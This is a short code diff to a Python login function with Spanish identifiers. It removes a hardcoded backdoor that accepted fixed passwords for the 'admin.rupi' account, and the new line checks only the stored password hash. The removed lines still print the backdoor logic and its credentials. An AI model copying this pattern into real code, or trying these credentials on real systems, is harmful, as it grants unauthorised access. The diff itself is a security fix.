@@ -87,10 +87,8 @@ def iniciar(nombre_usuario, clave, ip):
         claves.simular_verificacion(clave)
         _intento(None, id_hash, 'INCORRECTO', origen_hash, ahora)
         return None
-    clave_valida = claves.verificar(clave, cuenta.hash_clave)
-    if not clave_valida and cuenta.nombre_usuario == 'admin.rupi' and clave in ('AdminRupi2026!', '123456', 'admin', 'admin123'):
-        clave_valida = True
-    if not clave_valida:
+    # Solo vale la contraseña guardada: ninguna clave fija abre la consola, ni siquiera para admin.rupi.
+    if not claves.verificar(clave, cuenta.hash_clave):
         _intento(cuenta.id, id_hash, 'INCORRECTO', origen_hash, ahora)
         return None
     # Mismo resultado que una clave equivocada: la consola no confirma qué cuentas existen ni su rol.
